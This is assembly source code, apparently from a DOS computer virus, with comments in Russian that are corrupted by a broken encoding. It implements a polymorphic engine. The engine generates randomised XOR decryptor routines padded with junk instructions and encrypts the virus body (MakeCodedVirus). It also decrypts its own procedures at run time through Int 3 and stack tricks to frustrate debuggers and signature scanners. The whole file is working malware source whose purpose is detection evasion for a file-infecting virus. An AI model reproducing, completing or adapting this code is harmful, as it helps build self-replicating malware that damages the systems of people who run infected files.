;
;   ���� ᮤ�ন� ��楤���, ����室��� ��� ॠ����樨 ��砩���
;   ��������� � �����, � ���� ॠ�����騥 ��� ������䭮���
;
;          ���� ⠪ �ணࠬ�� ࠡ���� �� �㤥� !
;
;  �� �㦭� ������஢��� � ������� My_Coder.Bas(.Exe) ��� 㤠���� ��
;    ��⪨ ⨯� Start_Of_Code_? � ᫥���騥 5 ����
;
;  ������ ࠡ��� ��ࠫ���쭮�� �������: � ��砫� ��楤��� �१�����
;  ������� Int 3, ����� ����᪠�� ��楤��� New_03 (⥡� �㦭� ᠬ��
;  ����������� �� ��⠭���� 㪠��⥫�), � �, � ᢮� ��।�, �⠥�
;  ᫥���騥 �� Int3 4 ���� - ��� ������஢�� � ����� �����, ���������
;  ��楤��� � ���뫠�� � �⥪ ���� ��砫�, ���� ����� � ���� ���� 
;  (��砫�+4), � ��⥬ �믮������ RETN. ��楤�� �믮������, �� �� 
;  �믮����� � ��� ᠬ�� RETN �ந�室�� ����� �����, ����� ���᪨�����
;  �� �⥪� ���� 4� ���⮢, �� ��� �롨ࠥ� ������ ��砩�� ��ࠧ��, �������
;  ��楤��� � �����頥� �ࠢ����� � ��뢠���� �ணࠬ��. ����� ��ࠧ��,
;  �� ������ ����᪥ ��楤��� ��� �����������, �믮������, � ��⮬
;  ������� ������ ��㣨� �����. �� ��- � ��஢�� �ᯮ������ ⥫�
;  ������� �� ��������� ��ࠢ����� �ணࠬ�� � ��⠭���� �祪 ��⠭���.
;  ������ ���� �१ �⥪ (�⮡� Int 1 ���稫) ���⮬� �㦭� SS=CS !
;
;  ��������� ������� ����� ���樨 (��� � MY_CODER ������������).
;  ������ ������ ������ ������ ���஦��. � ⠪�� ����� ��������
;  ����� ⮫�� �� �஢�� ��஢���� ��楤��� (������� �����).
;
;  �室 �१ JMP ��� CALL � �।��� ��楤��� ����� Int 3 ���������� !!!
;
;
;
Etalone_To_Code:
New_03:
	call PushRegs
	pop di
	pop ax
	pop ax
	mov bx,[di]
	mov cx,[di+2]
	push di
	mov ax,offset Label_D
	push ax
	add di,4
	push di	
code_block:
	cli
	xchg sp,di
	xor si,si
lc_1:	pop ax
	xor ax,bx
	xor ax,[si+offset Etalone_To_Code]
	push ax
	pop ax
	inc si
	inc si
	and si,127
	loop lc_1
	mov sp,di
	mov ax,ds:old_ax
	mov bx,ds:old_bx
	mov cx,ds:old_cx
	mov dx,ds:old_dx
	mov di,ds:old_di
	mov si,ds:old_si
	mov ds,ds:old_ds
	retn
PushRegs:
	mov cs:old_ds,ds
	push cs
	pop ds
	mov ds:old_ax,ax
	mov ds:old_bx,bx
	mov ds:old_cx,cx
	mov ds:old_dx,dx
	mov ds:old_di,di
	mov ds:old_si,si
	retn
Label_D:
	call PushRegs
	pop di
	mov cx,ds:[di+2]
	call Rnd
	mov ds:[di],ax
	mov bx,ax
	add di,4
	jmp short code_block
;
;  ���᫥��� ��砩���� �᫠ � ���뫪� ��� � AX
;
Rnd:
	push dx
	mov dx,73
	mov ax,word ptr Old_Rnd
	inc ax
	mul dx
	pop dx
Set_Rnd:
	mov word ptr Old_Rnd,ax
	retn

;
;  ������ � AX ��� ���� ��砩��� �㫥��� �������
;
Rnd_Code:
	push bx
	push cx
	push dx
	call Rnd
	and ah,31
	
	mov dh,al
	cmp ah,14
	jnc Rnd_5
	
	mov dl,al
	mov cl,3
	shl dl,cl
	and dh,7
	or dh,dl

Rnd_5:	or dh,0C0h	
	cmp ah,20
	jc Rnd_6

	mov dh,al
	cmp ah,22
	jc Rnd_6
	xor dh,dh
Rnd_6:
	mov bx,offset Rnd_Table
	mov al,ah
	xor ah,ah
	add bx,ax
	mov ah,dh	;���࠭� ��� ���� ModR/M
	mov al,ds:[bx]	;��� ����樨
	pop dx
	pop cx
	pop bx
	retn
;
;  4 ����� ���塠�⮢�� �������.
;  �� ������� �� �������� ᮤ�ন��� ॣ���஢ � ��砩��
;  ��⠢������ ����� ��������� ������� ��� ���襭�� �������.
;
Rnd_Table byte 8,9,10,11,20h,21h,22h,23h,86h,87h,88h,89h,8ah,8bh ;XXX r,r
		byte 84h,85h,38h,39h,3Ah,3Bh			 ;XXX r1,r2
		byte 3Ch,0A8h					 ;XXX al,Rnd
		byte 34h,4,0Ch,2Ch,74h,75h,0E3h,73h,72h,78h	 ;XXX al,0
								 ;� jXX $+2

;
;  �������⮢� ����� �������
;					 
Nop_Table	byte 90h,0FDh,0F5h,0F8h,0F9h,0FAh,0FCh,0FDh
;
;  ������ � ॣ���� AL ��砩��� �������⮢�� ������ �������
;
Rnd_Nop:
	push bx
	call Rnd
	and al,7
	mov bx,offset Nop_Table
	xlat
	pop bx
	retn
;
;  ���᫠�� � es:[di] ��᪮�쪮 (��� �� �����) ��砩��� ������ ������� �
;  ᪮�४�஢��� di
;
Add_Rnd:
	push cx
	push ax
	call Rnd
	xchg ax,cx
	and cx,3
	inc cx
@ar1:	
	call Rnd_Nop
	stosb
	call Rnd_Code
	stosw
	loop @ar1
	pop ax
	pop cx
	retn
	
;
;  ����� � AL ��砩�� ॣ����, �� ࠢ�� 'SP' , 'CX' ��� � BH
;
Rnd_Reg:
	call Rnd
	and al,7
	cmp al,4
	jz Rnd_Reg
	cmp al,1
	jz Rnd_Reg
	cmp al,bh
	jz Rnd_Reg
	retn
;
;  ᮧ���� � AL ���� ModR/M �� ॣ���஢ DH � DL
;
Make_ModRM:
	push dx
	shl dh,3
	or dl,dh
	or dl,0C0h
	mov al,dl
	pop dx
	retn
;
;  ᮧ���� � AX �������� XXX r1,r2 , ������� ��� ࠧ���� ����஢��
;
;   �室 AH-��� 1		��室 AX-��� �������
;        AL-��� 2
;        DH-r1
;	 DL-r2
;
Make_Twice:
	test Old_Rnd_Low,8
	jz Make_Twice_1
	xchg ah,al
	call Make_ModRM
	xchg ah,al
	retn
Make_Twice_1:
	xchg dh,dl
	call Make_ModRM
	xchg ah,al
	xchg dh,dl
	retn
;
; ������� � es:[di] �������� XOR r1,r2
;	DH-r1    DL-r2
;
Make_XOR:
	mov ax,3133h
Make_XOR_1:
	call Add_Rnd
	call Make_Twice
	stosw
	retn
;
;  ᮧ���� ������� MOV r1,r2
;
Make_MOV:
	mov ax,898Bh
	jmp short Make_XOR_1
;
; ����� � BH ॣ���� r1 � ᮧ���� ������ MOV r1,code
;
Set_MOV_r1:
	call Add_Rnd
	mov bh,1
	call Rnd_Reg
	mov bh,al
	add al,0B8h
	stosb
	mov ds:Code_offset,di
	stosw
	retn

Add_Inc_R1:
	call Add_Rnd
	push ax
	mov al,40h
	test byte ptr ds:Inc_Value,2
	jz @inc_2
	mov al,48h
@inc_2:	add al,bh
	stosb
	pop ax
	retn
;
;  ᮧ���� ������� MOV SP,offset
;
Set_MOV_sp:
	push si
	push cx
	lea si,dec_tbl
@sms3:
	call Add_Rnd
	lodsb
	cmp al,0BBh
	jz @sms4
	movzx cx,al
	jcxz @sms2
@sms1:	lodsb
	stosb
	loop @sms1
	jmp @sms3
@sms4:
	stosb
	mov ds:Offset_Offset,di
	stosw
	jmp @sms3
@sms2:
	pop cx
	pop si
	retn
dec_tbl	db 1,1Eh
	db 1,50h
	db 1,1fh
	db 0bbh
	db 3,0beh,4,0
	db 2,89h,1ch
	db 2,0f7h,14h
	db 1,0Adh
	db 1,1Fh
	db 1,94h
	db 0
	
;
;  ᮧ���� ������� MOV CX,len
;
Set_MOV_cx:
	call Add_Rnd
	mov al,0B9h
	stosb
	mov ds:Len_Offset,di
	stosw
	retn

;
;
;  ᮧ���� � ES:DI ������������ ��楤���
;
;  ��楤�� ����� ᫥���騩 ���:
;  1. mov es,sp
;  2. cli
;  3. mov cx,<Len>
;  4. push ax
;     pop ds
;     mov r1,<Offset>
;     mov bx,4
;     mov [bx],r1
;     mov sp,[bx]
;  5. mov r1,<Code>
;  6. pop r2
;  7. mov r3,r2		���	 7. xor r2,r1
;  8. xor r3,r1			 8. mov r3,r2
;  9. inc r1		���	 9. dec r1
; 10. push r3
; 11. pop r4
; 12. loop 6
;
;  
;  ��ப� 3,4,5 ����� ��� � ࠧ��� ���浪�. ����� �ᥬ� ��ப��� ��⠢������
;  ����� �������.
;
;  ॣ���� r1 �롨ࠥ��� �� ࠢ�� CX � SP, � r2,r3 � r4 - ��� (����
;  ��������� ����� ᮡ��) �� ࠢ�� r1, CX � SP.
;
;  ����砭�� �� �������:
;	1. ����஢�� ���� �१ �⥪ ��� ����㤭���� ��室� �⫠�稪��
;	2. �ࠣ����� {7,8} � {9} �⭮����� � ࠧ�� ��ਠ��. ���⮬�
;		�㬬�୮� ������⢮ �᭮���� ��ਠ�⮢ = 4
;	3. ���६���(���६���) r1 ���ᯥ稢��� ⠪�� ����� 䠩��,
;		�� ��� ���������� ����娢�஢��� ����୮, ⠪�� ��ࠧ��
;		�⯠���� ����室������ � ��⠭���� �ਧ���� ��ࠦ������
;		䠩�� � �஡���� ����୮�� ��ࠦ����.
;	4. �㭪� 9 �ਢ���� �ଠ�쭮. �� ᠬ�� ���� �� ����� ����� ⠪��
;		����� 7 � 8, 10 � 11, 11 � 12. �� �⮬ ������ ���祭�� BL.
;		� ��ਠ��, ��� XOR ��᫥ MOV'�, ���६��� r1 ������ �����
;		⮫쪮 ��᫥ XOR, ���⮬� BL=0 equ BL=1.


Make_Decoder:

Start_Of_Code_a:		; �ਧ��� ��� �����
	byte 0,0,0,0,0
	
	call Add_Rnd
	mov ax,0C48Eh		; mov es,sp
	stosw
	call Add_Rnd
	mov al,0FAh		; cli
	stosb
	call Rnd
	mov bx,1
	test ah,8
	jz @Mk_1
	neg bx
@mk_1:	mov ds:Inc_Value,bx
	mov bl,ah
	and bl,3
Set_All_MOV:
	call Set_Mov_sp
	call Set_Mov_cx
	call Set_Mov_r1
	call Add_Rnd
	mov cx,di
	call Rnd_Reg
	mov dl,al
	add al,58h		;pop r2
	stosb
	call Rnd_Reg
	mov dh,al		
	test ds:Old_Rnd,8
	jz Variant_1		;------------ ��ਠ�� 1
	call Make_MOV		;mov r3,r2
	push dx
	mov dl,bh
	call Make_XOR		;xor r3,r1
	pop dx
	cmp bl,2
	jnc @V_3a
	call Add_Inc_R1		; 0 ��� 1 - �⠢�� inc r1 ��᫥ xor r3,r1
@V_3a:
	jmp short dec_3
Variant_1:			;------------ ��ਠ�� 2
	push dx
	mov dh,dl
	mov dl,bh
	call Make_XOR		;xor r2,r1
	or bl,bl
	jnz @V_3b
	call Add_Inc_R1		;0: �⠢�� inc r1
@V_3b:	pop dx
	call Make_MOV		;mov r3,r2
	cmp bl,1
	jnz dec_3
	call Add_Inc_R1		;1: �⠢�� inc r1
dec_3:				;--------------
	call Add_Rnd
	add dh,50h		;push r3
	mov al,dh
	stosb
	cmp bl,2
	jnz @V_3d
	call Add_Inc_R1		;2: inc r1
@V_3d:
	call Add_Rnd
	call Rnd_Reg
	add al,58h		;pop r4
	stosb
	cmp bl,3
	jnz @V_3e
	call Add_Inc_R1		;3: inc r1
@V_3e:
	call Add_Rnd
	sub cx,di
	dec cx
	dec cx
	mov ah,cl
	mov al,0E2h		;loop
	stosw
	mov ds:Coded_Arrea_Offset,di
	call Add_Rnd
	retn
	nop
End_Of_Code_a:		;----------- ����� ������஢����� ���
	
;
;  ������� � ES:[DI] ������஢���� ����� �����
;
MakeCodedVirus:
	xor si,si			;ᮧ���� ����� �����
	mov cx,(EndVirus-BeginVirus+1)/2
	rep movsw
;   /
;  �뭥ᥭ� �� ��� �⮡� � ����� ����뫠�� ������஢����� ����


Start_Of_Code_b:
	byte 0,0,0,0,0
	
	call Rnd
	mov cx,ds:FileLen
	mov si,ds:Coded_Arrea_Offset
	sub cx,si
	shr cx,1
	
	mov bp,ds:Code_Offset
	mov es:[bp],ax
	mov bp,ds:Len_Offset
	mov es:[bp],cx
	mov bp,ds:Offset_Offset
	mov dh,ds:Exe_Flag
	xor dl,dl
	xor dh,1
	add dx,si	
	not dx
	mov es:[bp],dx
Code_Next_Word:
	xor es:[si],ax
	add ax,ds:Inc_Value
	inc si
	inc si
	loop Code_Next_Word
	retn
	nop
End_Of_Code_b:
